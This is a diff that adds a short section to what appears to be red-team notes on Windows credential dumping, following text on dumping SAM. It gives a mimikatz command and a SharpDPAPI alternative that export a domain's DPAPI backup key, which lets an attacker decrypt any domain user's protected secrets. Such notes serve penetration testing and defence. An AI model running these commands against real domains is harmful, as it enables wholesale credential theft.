@@ -28,3 +28,21 @@ now go and run more comands....
 Don't worry if you are failing to dump “**sam**”. You have **DC** and **Administrators** **hash** which we can use to dump “**sam**” with **impackets**, **Metasploit**, etc.
 
 - - -
+## By AlH4zr3d  : 
+https://twitter.com/Alh4zr3d/status/1616509628480880641
+
+![Imgur](https://i.imgur.com/oB0Tz3A.png)
+
+```c
+lsadump::backupkeys /system:dc01.offense.local /export
+```
+
+To be clear, this is a mimikatz command that requires **domain admin permissions**, but once the backup key is obtained, it allows you to **decrypt the master keys** protecting data blobs (like passwords) from any domain user.
+
+#### SharpDPAPI alternative : 
+
+```
+SharpDPAPI.exe backupkey /nowrap
+```
+
+ - - -
